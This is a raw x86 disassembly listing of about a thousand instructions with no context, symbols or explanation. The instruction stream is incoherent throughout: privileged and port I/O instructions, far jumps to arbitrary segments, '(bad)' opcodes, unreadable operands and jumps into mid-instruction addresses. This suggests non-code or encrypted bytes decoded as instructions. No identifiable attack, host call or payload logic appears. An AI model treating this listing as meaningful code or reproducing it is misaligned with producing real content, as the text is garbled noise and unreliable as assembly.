  4badbc:	and    al,0x46
  4badbe:	mov    DWORD PTR [eax+ecx*4],esi
  4badc1:	cdq    
  4badc2:	lahf   
  4badc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4badc4:	push   ebx
  4badc5:	shr    BYTE PTR [ecx],0x14
  4badc8:	jo     0x4badcc
  4badca:	mov    DWORD PTR [edi+eiz*4],0xb2812ef5
  4badd1:	inc    ecx
  4badd2:	adc    dh,BYTE PTR [edi+0x61b90963]
  4badd8:	jmp    0x4bade2
  4badda:	je     0x4bae1d
  4baddc:	cmp    al,bl
  4badde:	xchg   ebx,eax
  4baddf:	fiadd  WORD PTR [edx]
  4bade1:	sub    BYTE PTR [ebp+eax*1+0xa857d4c],bh
  4bade8:	push   es
  4bade9:	movzx  ebx,WORD PTR [edx+ecx*8+0x4]
  4badee:	in     al,0x84
  4badf0:	lds    esp,FWORD PTR ds:0x27bad4a4
  4badf6:	dec    ebx
  4badf7:	cli    
  4badf8:	loopne 0x4bae54
  4badfa:	xor    esp,DWORD PTR [edi-0x60a699d4]
  4bae00:	mov    gs,WORD PTR [esi]
  4bae02:	cmp    ah,BYTE PTR [ebp-0x72]
  4bae05:	pusha  
  4bae06:	cmp    ebx,ecx
  4bae08:	gs inc edx
  4bae0a:	mov    DWORD PTR [eax-0x37298d60],0x946290d2
  4bae14:	cli    
  4bae15:	retf   
  4bae16:	inc    edx
  4bae17:	jl     0x4badfe
  4bae19:	dec    ecx
  4bae1a:	push   ebx
  4bae1b:	scas   al,BYTE PTR es:[edi]
  4bae1c:	inc    esp
  4bae1d:	jge    0x4bada4
  4bae1f:	call   0x4a7e76d5
  4bae24:	adc    BYTE PTR [edx+0x4b401875],bl
  4bae2a:	or     BYTE PTR [edi],cl
  4bae2c:	dec    eax
  4bae2d:	and    ebx,0x1c0b5282
  4bae33:	scas   eax,DWORD PTR es:[edi]
  4bae34:	ret    0x3c13
  4bae37:	inc    ebx
  4bae38:	and    al,BYTE PTR [ebx+ebp*8]
  4bae3b:	inc    esp
  4bae3c:	les    esi,FWORD PTR [ebx]
  4bae3e:	mov    ?,WORD PTR [edx-0x57]
  4bae41:	cmp    eax,0x4da5c9fc
  4bae46:	jge    0x4bae50
  4bae48:	xchg   ecx,eax
  4bae49:	shl    BYTE PTR [edx],0xb8
  4bae4c:	cwde   
  4bae4d:	shr    BYTE PTR [eax],1
  4bae4f:	pop    es
  4bae50:	push   edx
  4bae51:	jne    0x4bae67
  4bae53:	jmp    0x7e51:0x5733422b
  4bae5a:	dec    eax
  4bae5b:	loop   0x4baed3
  4bae5d:	push   cs
  4bae5e:	scas   al,BYTE PTR es:[edi]
  4bae5f:	inc    edx
  4bae60:	mov    esi,0xc68b2a8b
  4bae65:	sti    
  4bae66:	pop    ds
  4bae67:	jne    0x4bae5d
  4bae69:	rol    DWORD PTR [eax+0xd],0xa
  4bae6d:	(bad)  
  4bae6e:	sar    BYTE PTR [ebx+0x77855108],0xcb
  4bae75:	sti    
  4bae76:	push   ss
  4bae77:	push   ebx
  4bae78:	jmp    0x4bae94
  4bae7a:	ss push ds
  4bae7c:	(bad)  
  4bae7d:	into   
  4bae7e:	cli    
  4bae7f:	sub    ah,BYTE PTR [edi]
  4bae81:	int    0xd2
  4bae83:	ss dec esp
  4bae85:	push   ecx
  4bae86:	sub    esp,edi
  4bae88:	test   ebx,0x91265603
  4bae8e:	or     eax,0xc3090e84
  4bae93:	pop    ebx
  4bae94:	aam    0xc0
  4bae96:	outs   dx,BYTE PTR ds:[esi]
  4bae97:	mov    al,ds:0x7da3c3d0
  4bae9c:	inc    edx
  4bae9d:	test   DWORD PTR [esi],0xb1bbc247
  4baea3:	jnp    0x4bae80
  4baea5:	or     al,0xb3
  4baea7:	test   eax,0x73eb3a41
  4baeac:	mov    ds:0x11c07217,al
  4baeb1:	repz into 
  4baeb3:	loope  0x4bae37
  4baeb5:	add    dl,cl
  4baeb7:	and    al,0xe2
  4baeb9:	cmp    dl,cl
  4baebb:	ins    BYTE PTR es:[edi],dx
  4baebc:	or     bl,ch
  4baebe:	pop    ecx
  4baebf:	mov    cl,0xdb
  4baec1:	add    eax,0x54331390
  4baec6:	jno    0x4baeb3
  4baec8:	dec    eax
  4baec9:	ja     0x4baf46
  4baecb:	adc    DWORD PTR [ecx],0x3c
  4baece:	enter  0x37eb,0x15
  4baed2:	or     eax,DWORD PTR [eax-0xa]
  4baed5:	jmp    0x4baefd
  4baed7:	sub    BYTE PTR gs:[edx+0x11420788],bh
  4baede:	mov    ah,0x3c
  4baee0:	xor    al,0x6d
  4baee2:	jo     0x4baf44
  4baee4:	inc    edx
  4baee5:	hlt    
  4baee6:	jno    0x4baf28
  4baee8:	mov    ebp,0x690f235a
  4baeed:	cmp    BYTE PTR [ecx],ah
  4baeef:	stos   BYTE PTR es:[edi],al
  4baef0:	addr16 push esi
  4baef2:	mov    esi,DWORD PTR [ecx+0xcc38a99]
  4baef8:	mov    bh,0x6e
  4baefa:	fnstsw WORD PTR [ecx]
  4baefc:	jne    0x4baf02
  4baefe:	dec    esi
  4baeff:	push   0x1ce85323
  4baf04:	loopne 0x4baea4
  4baf06:	mov    al,0xf4
  4baf08:	loop   0x4baeb3
  4baf0a:	ret    0xefc3
  4baf0d:	mov    DWORD PTR [eax+esi*4],ecx
  4baf10:	xor    al,0x30
  4baf12:	xor    BYTE PTR [ebx-0x54],ah
  4baf15:	lea    ebp,[ecx]
  4baf17:	sbb    DWORD PTR [edx+0x300e9ec5],eax
  4baf1d:	lahf   
  4baf1e:	or     DWORD PTR [ecx+0x3dd09e48],esp
  4baf24:	inc    eax
  4baf25:	scas   eax,DWORD PTR es:[edi]
  4baf26:	je     0x4baf2b
  4baf28:	dec    esi
  4baf29:	fst    QWORD PTR [ecx+0x44]
  4baf2c:	or     eax,0x3ad8517b
  4baf31:	inc    ecx
  4baf32:	sub    esi,DWORD PTR ss:[ebp+0xf]
  4baf36:	inc    eax
  4baf37:	push   ds
  4baf38:	add    bl,BYTE PTR [esi+0x1fb40823]
  4baf3e:	dec    eax
  4baf3f:	shl    BYTE PTR ss:[ebx],1
  4baf42:	pop    ebp
  4baf43:	call   0x9ae2a5d
  4baf48:	ins    BYTE PTR es:[edi],dx
  4baf49:	ins    DWORD PTR es:[edi],dx
  4baf4a:	cwde   
  4baf4b:	mov    al,0x22
  4baf4d:	push   es
  4baf4e:	or     al,0x4f
  4baf50:	cdq    
  4baf51:	call   0x4ab8:0x22023c94
  4baf58:	mov    ch,0x85
  4baf5a:	push   edx
  4baf5b:	inc    esi
  4baf5c:	hlt    
  4baf5d:	and    cl,bh
  4baf5f:	sub    DWORD PTR [ecx+eax*8+0x42],0xffffff92
  4baf64:	ja     0x4bafb9
  4baf66:	(bad)  
  4baf67:	(bad)  
  4baf68:	and    dh,dh
  4baf6a:	fs mov esp,0xcd0a068b
  4baf70:	cmp    BYTE PTR [edx+esi*8-0x5d],0x2e
  4baf75:	test   eax,0xb66e0c60
  4baf7a:	and    eax,0x9415ea10
  4baf7f:	pop    eax
  4baf80:	test   al,0xa3
  4baf82:	inc    ebp
  4baf83:	pop    es
  4baf84:	or     ebp,DWORD PTR [ecx]
  4baf86:	inc    ecx
  4baf87:	and    BYTE PTR [eax],ah
  4baf89:	adc    bl,BYTE PTR [esi]
  4baf8b:	jl     0x4bafbc
  4baf8d:	ins    DWORD PTR es:[edi],dx
  4baf8e:	or     ch,BYTE PTR [esi+0x4a]
  4baf91:	stc    
  4baf92:	pop    ds
  4baf93:	jle    0x4bafa3
  4baf95:	stc    
  4baf96:	adc    eax,0x721f1a50
  4baf9b:	call   0x3e94:0x9908b9d0
  4bafa2:	shl    BYTE PTR [esi],0xa1
  4bafa5:	xchg   BYTE PTR [edx],dh
  4bafa7:	xor    DWORD PTR [ebx+0x6d],edx
  4bafaa:	loope  0x4bafee
  4bafac:	jmp    0x4bafeb
  4bafae:	mov    edx,0x9d186443
  4bafb3:	scas   al,BYTE PTR es:[edi]
  4bafb4:	mov    ah,0x5c
  4bafb6:	jnp    0x4baf75
  4bafb8:	xchg   BYTE PTR [ebx+eax*4],al
  4bafbb:	inc    esp
  4bafbc:	xor    edx,0xfe04213
  4bafc2:	ror    BYTE PTR ss:[edx],0x20
  4bafc6:	mov    bh,0x71
  4bafc8:	or     BYTE PTR [esi],ah
  4bafca:	fadd   DWORD PTR [ebx+ebp*1]
  4bafcd:	repz dec esi
  4bafcf:	rol    esp,1
  4bafd1:	pop    ss
  4bafd2:	sub    BYTE PTR [ecx+esi*1-0x4c],bl
  4bafd6:	adc    DWORD PTR [ecx],esi
  4bafd8:	shl    DWORD PTR [esi],0x3f
  4bafdb:	inc    esi
  4bafdc:	dec    ebx
  4bafdd:	adc    al,0x99
  4bafdf:	ficom  WORD PTR [ecx+esi*2]
  4bafe2:	fs std 
  4bafe4:	stc    
  4bafe5:	std    
  4bafe6:	je     0x4bafc8
  4bafe8:	jo     0x4baf6c
  4bafea:	xor    BYTE PTR [ebx+0x56],dl
  4bafed:	push   ecx
  4bafee:	outs   dx,DWORD PTR ds:[esi]
  4bafef:	push   ebx
  4baff0:	inc    edx
  4baff1:	add    edx,ecx
  4baff3:	push   0x896034ff
  4baff8:	mov    eax,ds:0x49cf6af
  4baffd:	call   0x56b5:0x3e6c8704
  4bb004:	mov    al,ds:0x35ebc368
  4bb009:	pop    DWORD PTR [ebx+ebp*1+0x47]
  4bb00d:	pop    ss
  4bb00e:	pop    eax
  4bb00f:	or     ch,BYTE PTR [ebp+edi*2+0xc503492]
  4bb016:	add    DWORD PTR [ebx],0x6f988ad3
  4bb01c:	mov    dl,0xa9
  4bb01e:	inc    esi
  4bb01f:	xor    BYTE PTR [ebx+0x5c],bl
  4bb022:	ins    BYTE PTR es:[edi],dx
  4bb023:	inc    ebx
  4bb024:	cmp    ebx,DWORD PTR [ebp+ebp*2+0x4e]
  4bb028:	jmp    FWORD PTR [esi+0x22]
  4bb02b:	rcr    DWORD PTR [ecx],1
  4bb02d:	xchg   BYTE PTR [ebp+0x15],dl
  4bb030:	cmp    BYTE PTR [ecx+eax*1],ah
  4bb033:	mov    bh,0x41
  4bb035:	adc    al,0xb7
  4bb037:	push   edx
  4bb038:	dec    DWORD PTR [eax]
  4bb03a:	ret    
  4bb03b:	dec    ecx
  4bb03c:	clc    
  4bb03d:	repz jb 0x4bb02f
  4bb040:	sti    
  4bb041:	loope  0x4bb07f
  4bb043:	sbb    ah,0xc9
  4bb046:	and    BYTE PTR [ebx+0x18],ch
  4bb049:	jo     0x4bb05e
  4bb04b:	aam    0x57
  4bb04d:	inc    edi
  4bb04e:	lock and al,0x57
  4bb051:	and    DWORD PTR [eax+0x7b087823],eax
  4bb057:	sub    eax,0x1082a530
  4bb05c:	inc    esi
  4bb05d:	mov    ebx,DWORD PTR [ecx-0x27]
  4bb060:	lods   eax,DWORD PTR ss:[esi]
  4bb062:	rcr    BYTE PTR [edx],0x6e
  4bb065:	retf   
  4bb066:	add    ecx,DWORD PTR [eax+0x7]
  4bb069:	add    al,0x6
  4bb06b:	mov    edx,0xbcf71003
  4bb070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bb071:	mul    ch
  4bb073:	push   ds
  4bb074:	sbb    BYTE PTR [ecx],ch
  4bb076:	push   es
  4bb077:	enter  0xeb43,0x60
  4bb07b:	popa   
  4bb07c:	push   es
  4bb07d:	add    DWORD PTR [ebx],eax
  4bb07f:	add    al,0x6
  4bb081:	jge    0x4bb01c
  4bb083:	aam    0x5
  4bb085:	add    eax,0x2b09b025
  4bb08a:	push   0x1e898ec3
  4bb08f:	and    DWORD PTR [ebx],eax
  4bb091:	jbe    0x5d257e6
  4bb097:	rol    DWORD PTR [esi+0x1c7e5b02],cl
  4bb09d:	jnp    0x4bb0d0
  4bb09f:	and    al,0x6b
  4bb0a1:	or     ah,BYTE PTR [eax]
  4bb0a3:	add    al,0x33
  4bb0a5:	ins    BYTE PTR es:[edi],dx
  4bb0a6:	pushw  ss
  4bb0a8:	and    DWORD PTR [eax+eax*2+0x46],edx
  4bb0ac:	cmp    BYTE PTR [ecx+eax*1-0x7c896597],dl
  4bb0b3:	imul   ecx,DWORD PTR [esp+eax*1+0x50],0xf0865854
  4bb0bb:	call   0xe055:0x64605ca6
  4bb0c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bb0c3:	or     dl,BYTE PTR [edi]
  4bb0c5:	ja     0x4bb12f
  4bb0c7:	mov    ?,WORD PTR [ebx+0x3e6dbc70]
  4bb0cd:	imul   edi,DWORD PTR [ebx+0xf478db2],0x6c557cb6
  4bb0d7:	xchg   BYTE PTR [eax+0xb0f0190],al
  4bb0dd:	mov    eax,0xdf8813d3
  4bb0e2:	rcl    DWORD PTR [eax+0x921d2d2],0x5d
  4bb0e9:	push   ss
  4bb0ea:	rcl    BYTE PTR [edi-0x3b181a91],0x88
  4bb0f1:	xchg   BYTE PTR [esi+eax*4+0x70],ch
  4bb0f5:	or     esi,DWORD PTR [eax+edi*2-0x1b]
  4bb0f9:	mov    ebx,0x807c2e5c
  4bb0fe:	test   BYTE PTR [ebx-0x78],dl
  4bb101:	retf   
  4bb102:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bb103:	cmp    eax,0x980b8cdf
  4bb108:	data16 xor BYTE PTR [esi+ebx*4-0x41a3468e],bl
  4bb110:	mov    al,ds:0xb0a8a40b
  4bb115:	mov    ah,0x92
  4bb117:	mov    ebx,ecx
  4bb119:	in     eax,0xc8
  4bb11b:	int3   
  4bb11c:	rcl    dl,1
  4bb11e:	add    esp,DWORD PTR [ebp-0x4c]
  4bb121:	rol    DWORD PTR [esi-0x1ebb297b],1
  4bb127:	sbb    DWORD PTR [ebp+0x1b],ebx
  4bb12a:	mov    DWORD PTR [ecx+0x62aa0324],eax
  4bb130:	jo     0x4bb0cc
  4bb132:	js     0x4bb0d4
  4bb134:	(bad)  
  4bb135:	push   edi
  4bb136:	dec    esi
  4bb137:	test   BYTE PTR [ecx+0xd],dh
  4bb13a:	add    eax,edi
  4bb13c:	jmp    esp
  4bb13e:	mov    dh,0x8c
  4bb140:	inc    esp
  4bb141:	and    DWORD PTR [edx+0x301ffd82],0x58
  4bb148:	cmp    ecx,DWORD PTR [ecx+0x74f93b3e]
  4bb14e:	jnp    0x4bb1a0
  4bb150:	cld    
  4bb151:	in     eax,0x2a
  4bb153:	sub    edx,esi
  4bb155:	and    BYTE PTR [esi],bl
  4bb157:	and    BYTE PTR [ebx+0xf44b951],bh
  4bb15d:	or     bh,BYTE PTR [eax-0x8]
  4bb160:	dec    ebp
  4bb161:	or     BYTE PTR [edi],ch
  4bb163:	xchg   edi,eax
  4bb164:	mov    eax,ds:0xfe8d1c49
  4bb169:	jle    0x4bb11b
  4bb16b:	ret    0xa81f
  4bb16e:	adc    bh,BYTE PTR [ecx]
  4bb170:	ds jle 0x4bb197
  4bb173:	mov    ecx,0x53e8601f
  4bb178:	cmp    al,0x56
  4bb17a:	stos   BYTE PTR es:[edi],al
  4bb17b:	add    edx,edi
  4bb17d:	nop
  4bb17e:	inc    esp
  4bb17f:	daa    
  4bb180:	adc    dh,ch
  4bb182:	nop
  4bb183:	rol    BYTE PTR [edi+0x20c77e10],cl
  4bb189:	sahf   
  4bb18a:	push   es
  4bb18b:	jl     0x4bb16e
  4bb18d:	mov    edx,0xcd1ae30d
  4bb192:	in     eax,0x4
  4bb194:	lea    edx,[esi+0x42]
  4bb197:	push   ss
  4bb198:	cli    
  4bb199:	ins    BYTE PTR es:[edi],dx
  4bb19a:	add    cl,BYTE PTR [esi]
  4bb19c:	mov    DWORD PTR [eax-0x6e4e798a],ecx
  4bb1a2:	cli    
  4bb1a3:	addr16 inc edi
  4bb1a5:	test   DWORD PTR [esp+edx*4-0x78],esi
  4bb1a9:	xlat   BYTE PTR ds:[ebx]
  4bb1aa:	push   si
  4bb1ac:	mov    esi,0x4ba0354d
  4bb1b1:	or     al,0xb5
  4bb1b3:	ins    BYTE PTR es:[edi],dx
  4bb1b4:	jns    0x4bb164
  4bb1b6:	and    eax,0xb2379170
  4bb1bb:	and    ebx,0x23
  4bb1be:	mov    al,ds:0x268c96b
  4bb1c3:	dec    eax
  4bb1c4:	loope  0x4bb1db
  4bb1c6:	pop    eax
  4bb1c7:	cmp    al,0x24
  4bb1c9:	xchg   ebx,eax
  4bb1ca:	mov    BYTE PTR [ebp+0x5b3f6ac],dl
  4bb1d0:	outs   dx,BYTE PTR ds:[esi]
  4bb1d1:	ja     0x4bb241
  4bb1d3:	adc    esi,DWORD PTR [edi+0x5b]
  4bb1d6:	sbb    al,0x91
  4bb1d8:	pop    eax
  4bb1d9:	or     edx,ebp
  4bb1db:	inc    esp
  4bb1dc:	or     ecx,DWORD PTR [ebp+esi*2-0x18bfbf65]
  4bb1e3:	dec    edi
  4bb1e4:	fisubr WORD PTR [ecx]
  4bb1e6:	xchg   bl,ah
  4bb1e8:	inc    edx
  4bb1e9:	cmp    BYTE PTR [esi],ch
  4bb1eb:	cs jmp 0x4bb213
  4bb1ee:	sub    DWORD PTR [ebx],0x3c4e6bc8
  4bb1f4:	push   ds
  4bb1f5:	push   ds
  4bb1f6:	cli    
  4bb1f7:	inc    ebx
  4bb1f8:	ret    
  4bb1f9:	and    eax,0x57962ba8
  4bb1fe:	adc    DWORD PTR [esi],edi
  4bb200:	sub    al,0xe4
  4bb202:	ss mov al,0x2f
  4bb205:	jge    0x4bb267
  4bb207:	lods   eax,DWORD PTR ds:[esi]
  4bb208:	enter  0x5b03,0xb1
  4bb20c:	or     DWORD PTR [ebx+0x9a1405f],edx
  4bb212:	pop    esp
  4bb213:	and    BYTE PTR [ebp+eax*1+0x35],cl
  4bb217:	ret    
  4bb218:	xchg   DWORD PTR [ebp+0x56],ecx
  4bb21b:	aad    0x9
  4bb21d:	ja     0x4bb265
  4bb21f:	cmp    ecx,DWORD PTR [edi]
  4bb221:	mov    ds,WORD PTR [edi-0x25]
  4bb224:	mov    al,0x24
  4bb226:	dec    esi
  4bb227:	dec    esi
  4bb228:	and    BYTE PTR [esi-0x53],bl
  4bb22b:	mov    edi,DWORD PTR [edi+0x24]
  4bb22e:	mov    DWORD PTR [edx],esp
  4bb230:	dec    esi
  4bb231:	fiadd  DWORD PTR [ebp-0x6fa83701]
  4bb237:	mov    BYTE PTR es:[ebx-0x2fe6466],ah
  4bb23e:	pop    es
  4bb23f:	dec    edi
  4bb240:	xor    esi,DWORD PTR [esi]
  4bb242:	lea    ebx,cs:[edx+0x48504405]
  4bb249:	add    DWORD PTR [edx],esi
  4bb24b:	mov    edx,0x9c1d3bef
  4bb250:	or     al,0x5f
  4bb252:	mov    ds:0x4e325b19,eax
  4bb257:	inc    esi
  4bb258:	in     al,0x6c
  4bb25a:	pushf  
  4bb25b:	pusha  
  4bb25c:	ds push edx
  4bb25e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4bb25f:	add    ah,BYTE PTR [esi-0x6c]
  4bb262:	or     bh,BYTE PTR [esi+0x13]
  4bb265:	push   0x27
  4bb267:	ret    
  4bb268:	fdivr  DWORD PTR [ebp-0x77]
  4bb26b:	jne    0x4bb272
  4bb26d:	jle    0x4bb28a
  4bb26f:	ret    0xfe42
  4bb272:	jl     0x4bb261
  4bb274:	inc    ebx
  4bb275:	and    dl,BYTE PTR [edx-0x9]
  4bb278:	ret    0x9890
  4bb27b:	mov    eax,ds:0xecef1454
  4bb280:	dec    eax
  4bb281:	xchg   edx,eax
  4bb282:	test   al,0x2f
  4bb284:	mov    WORD PTR [ebx+ecx*8],ds
  4bb287:	or     eax,0x8365b269
  4bb28c:	jle    0x4bb302
  4bb28e:	and    esi,DWORD PTR [ebp+0x542c0c82]
  4bb294:	xchg   esi,eax
  4bb295:	cmp    ch,BYTE PTR [esp+eax*4+0x22]
  4bb299:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bb29a:	inc    ebp
  4bb29b:	jne    0x4bb27a
  4bb29d:	cmp    al,0xaf
  4bb29f:	pop    ecx
  4bb2a0:	jmp    0xa18b775
  4bb2a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bb2a6:	push   es
  4bb2a7:	fucom  st(6)
  4bb2a9:	aam    0xa3
  4bb2ab:	xor    bl,0xf2
  4bb2ae:	ins    DWORD PTR es:[edi],dx
  4bb2af:	lods   al,BYTE PTR ds:[esi]
  4bb2b0:	ss mov ch,0xda
  4bb2b3:	leave  
  4bb2b4:	mov    ecx,0x290f5e43
  4bb2b9:	and    DWORD PTR [ebx+esi*2],0xffffffe1
  4bb2bd:	dec    edx
  4bb2be:	jmp    0x9c8f:0xb80206d0
  4bb2c5:	dec    eax
  4bb2c6:	sub    al,0x0
  4bb2c8:	call   0x21d41972
  4bb2cd:	mov    esp,0x80524a82
  4bb2d2:	jge    0x4bb26b
  4bb2d4:	imul   ecx,DWORD PTR [edx],0x344faa30
  4bb2da:	mov    DWORD PTR [edi+0x38],edx
  4bb2dd:	push   ss
  4bb2de:	mov    esp,0x2e501f69
  4bb2e3:	mov    BYTE PTR [edi+0x8],bl
  4bb2e6:	add    al,0x2c
  4bb2e8:	inc    eax
  4bb2e9:	mov    DWORD PTR [edi+0x44],ebx
  4bb2ec:	or     edx,DWORD PTR [edi+0x2810d352]
  4bb2f2:	stos   BYTE PTR es:[edi],al
  4bb2f3:	cli    
  4bb2f4:	or     DWORD PTR [esi+0x4a],0x78c7acc0
  4bb2fb:	test   al,0x35
  4bb2fd:	dec    ecx
  4bb2fe:	jbe    0x4bb350
  4bb300:	add    BYTE PTR [ebp+ecx*4-0x3e],0xc0
  4bb305:	adc    eax,0x60f1a160
  4bb30a:	add    esp,DWORD PTR [ebx]
  4bb30c:	in     al,dx
  4bb30d:	pop    eax
  4bb30e:	xor    dl,BYTE PTR [edx+0x8]
  4bb311:	lahf   
  4bb312:	xchg   edx,eax
  4bb313:	xor    al,0x2d
  4bb315:	jl     0x4bb29e
  4bb317:	xchg   BYTE PTR [esi],dl
  4bb319:	mov    ecx,esi
  4bb31b:	add    BYTE PTR [edi-0x80],0x47
  4bb31f:	sub    eax,0x10459d48
  4bb324:	and    dh,BYTE PTR [eax]
  4bb326:	aam    0xb4
  4bb328:	jecxz  0x4bb2f1
  4bb32a:	hlt    
  4bb32b:	and    BYTE PTR ds:0x4b8ec1a4,al
  4bb331:	imul   esp,DWORD PTR [edx+0x31355b06],0x75237844
  4bb33b:	pop    edi
  4bb33c:	dec    eax
  4bb33d:	push   ebx
  4bb33e:	push   edx
  4bb33f:	push   edi
  4bb340:	push   0xb1d903b9
  4bb345:	test   BYTE PTR [eax],cl
  4bb347:	mov    esp,0xbbf2471a
  4bb34c:	repz mov ebp,0x1051af32
  4bb352:	lahf   
  4bb353:	cwde   
  4bb354:	dec    ebx
  4bb355:	inc    edi
  4bb356:	pop    eax
  4bb357:	das    
  4bb358:	shl    BYTE PTR ds:0x1350ba95,cl
  4bb35e:	sub    eax,0x919a73a8
  4bb363:	xchg   ecx,eax
  4bb364:	jbe    0x4bb3d6
  4bb366:	and    BYTE PTR [eax-0x7437ec46],bh
  4bb36c:	aaa    
  4bb36d:	inc    ecx
  4bb36e:	push   esp
  4bb36f:	(bad)  
  4bb370:	or     dl,bh
  4bb372:	adc    BYTE PTR [ecx],0x8c
  4bb375:	mov    ah,0x34
  4bb377:	mov    eax,0x6b002f03
  4bb37c:	sub    DWORD PTR [edi+0x410c3e8d],esp
  4bb382:	push   ebp
  4bb383:	jge    0x4bb322
  4bb385:	dec    esp
  4bb386:	push   ebx
  4bb387:	inc    ecx
  4bb388:	and    al,0x18
  4bb38a:	rol    DWORD PTR [edx],cl
  4bb38c:	shl    DWORD PTR [eax+0x2211c6da],0x14
  4bb393:	xor    eax,DWORD PTR [edx+ebp*1-0x79]
  4bb397:	hlt    
  4bb398:	in     eax,0x17
  4bb39a:	add    ebp,DWORD PTR [eax]
  4bb39c:	sub    ah,ch
  4bb39e:	mov    WORD PTR [edx-0x3feb43ea],cs
  4bb3a4:	add    esp,DWORD PTR [eax-0x8b7b839]
  4bb3aa:	inc    edx
  4bb3ab:	rcr    BYTE PTR [eax],0x1a
  4bb3ae:	clc    
  4bb3af:	inc    eax
  4bb3b0:	cmp    al,0x37
  4bb3b2:	cmp    DWORD PTR [edi],0xffdbc14a
  4bb3b8:	add    ebp,ebx
  4bb3ba:	xlat   BYTE PTR ds:[ebx]
  4bb3bb:	cmp    al,0x70
  4bb3bd:	in     eax,dx
  4bb3be:	sub    DWORD PTR [eax],eax
  4bb3c0:	push   eax
  4bb3c1:	pop    esp
  4bb3c2:	dec    edi
  4bb3c3:	pop    edi
  4bb3c4:	cmp    edx,DWORD PTR [edx+0x740c1403]
  4bb3ca:	push   ss
  4bb3cb:	xor    edx,DWORD PTR [eax-0x3a]
  4bb3ce:	sbb    BYTE PTR [ebx+0x2],al
  4bb3d1:	test   BYTE PTR [edx],al
  4bb3d3:	adc    DWORD PTR [ecx+0x4d],ecx
  4bb3d6:	call   0xe6b0:0x30785403
  4bb3dd:	add    BYTE PTR [ecx-0x38a2ade7],cl
  4bb3e3:	inc    esp
  4bb3e4:	mov    edi,DWORD PTR [edx+0x52]
  4bb3e7:	push   es
  4bb3e8:	push   ebp
  4bb3e9:	cmp    cl,bh
  4bb3eb:	add    BYTE PTR [esi+0x12],0x36
  4bb3ef:	or     al,0xd5
  4bb3f1:	push   ss
  4bb3f2:	or     al,0xbe
  4bb3f4:	mov    al,ds:0x5ec29bfc
  4bb3f9:	retf   
  4bb3fa:	mov    DWORD PTR [eax+0x1160b08e],ebp
  4bb400:	or     ah,cl
  4bb402:	mov    al,ds:0x8b18626
  4bb407:	imul   eax,DWORD PTR [eax+0x122b40aa],0x201d0074
  4bb411:	add    al,0xeb
  4bb413:	jg     0x4bb3d5
  4bb415:	jp     0x4bb469
  4bb417:	or     edi,DWORD PTR [ebx+0x42]
  4bb41a:	pushf  
  4bb41b:	cmp    BYTE PTR [ebx+0x46],al
  4bb41e:	push   ss
  4bb41f:	or     dl,BYTE PTR [edi-0x55]
  4bb422:	xchg   esi,eax
  4bb423:	test   al,0x83
  4bb425:	adc    eax,0x65dad4d
  4bb42a:	adc    DWORD PTR [esi-0x29],0x28290842
  4bb431:	mov    edx,0xdb692814
  4bb436:	add    BYTE PTR [ecx-0x25],cl
  4bb439:	mov    ds:0x26b7eed0,eax
  4bb43e:	xchg   ecx,eax
  4bb43f:	and    al,0x89
  4bb441:	jnp    0x4bb453
  4bb443:	inc    esi
  4bb444:	xor    DWORD PTR [ecx],ecx
  4bb446:	popa   
  4bb447:	xchg   ecx,eax
  4bb448:	and    BYTE PTR [ebx],0xe0
  4bb44b:	or     ah,BYTE PTR [edx-0x3e153712]
  4bb451:	daa    
  4bb452:	push   ss
  4bb453:	outs   dx,BYTE PTR ds:[esi]
  4bb454:	and    DWORD PTR ds:0xf5fc8407,esi
  4bb45a:	add    esp,DWORD PTR [eax+0x14]
  4bb45d:	ror    ah,0xb8
  4bb460:	pop    edi
  4bb461:	and    cl,cl
  4bb463:	(bad)  
  4bb464:	fistp  DWORD PTR [eax+0x3a49117]
  4bb46a:	pop    esp
  4bb46b:	add    bl,BYTE PTR [ecx+0x350c3a18]
  4bb471:	pop    ebp
  4bb472:	pusha  
  4bb473:	sahf   
  4bb474:	inc    esi
  4bb475:	sbb    BYTE PTR [ebx-0x76],dl
  4bb478:	dec    eax
  4bb479:	xor    eax,DWORD PTR fs:[ebp+eiz*4+0x20]
  4bb47e:	imul   edx,esi,0xc2bd563
  4bb484:	jnp    0x4bb48c
  4bb486:	outs   dx,BYTE PTR ds:[esi]
  4bb487:	jg     0x4bb4a9
  4bb489:	arpl   WORD PTR [ebx+0x70f79250],ax
  4bb48f:	lods   eax,DWORD PTR ds:[esi]
  4bb490:	or     DWORD PTR [esp+ecx*8],ebp
  4bb493:	aam    0x4e
  4bb495:	arpl   WORD PTR [edx-0x20ff7cde],dx
  4bb49b:	or     DWORD PTR ds:0xd925bbb4,0x74c72e08
  4bb4a5:	add    ebx,DWORD PTR [eax+0x2e]
  4bb4a8:	ins    BYTE PTR es:[edi],dx
  4bb4a9:	xor    BYTE PTR [esi],bh
  4bb4ab:	push   eax
  4bb4ac:	dec    ecx
  4bb4ad:	je     0x4bb4c5
  4bb4af:	mov    ah,0x9d
  4bb4b1:	push   esi
  4bb4b2:	xor    ah,BYTE PTR [ebx]
  4bb4b4:	xor    al,0xde
  4bb4b6:	(bad)  
  4bb4b7:	call   edi
  4bb4b9:	or     ebp,ecx
  4bb4bb:	test   eax,0x1694a510
  4bb4c0:	adc    BYTE PTR [ebp+0x4908c38c],dl
  4bb4c6:	cmp    edx,esi
  4bb4c8:	out    dx,eax
  4bb4c9:	lea    esp,[ebx+edi*4+0x53fe5cc3]
  4bb4d0:	loope  0x4bb4f8
  4bb4d2:	mov    al,ds:0x2cc6013c
  4bb4d7:	jp     0x4bb4fc
  4bb4d9:	ret    0x79be
  4bb4dc:	add    dh,BYTE PTR [ebp+0x52]
  4bb4df:	rcl    BYTE PTR [ebx-0x26],cl
  4bb4e2:	shl    BYTE PTR [ebx-0x40],1
  4bb4e5:	out    0x96,al
  4bb4e7:	dec    eax
  4bb4e8:	test   DWORD PTR [edi+0xc],esp
  4bb4eb:	mov    ds:0xfa45128c,al
  4bb4f0:	pop    esp
  4bb4f1:	dec    ebx
  4bb4f2:	add    BYTE PTR [ebx+0x1007b9b2],ah
  4bb4f8:	mov    esp,0x56530886
  4bb4fd:	or     BYTE PTR [eax],ch
  4bb4ff:	ins    DWORD PTR es:[edi],dx
  4bb500:	push   edx
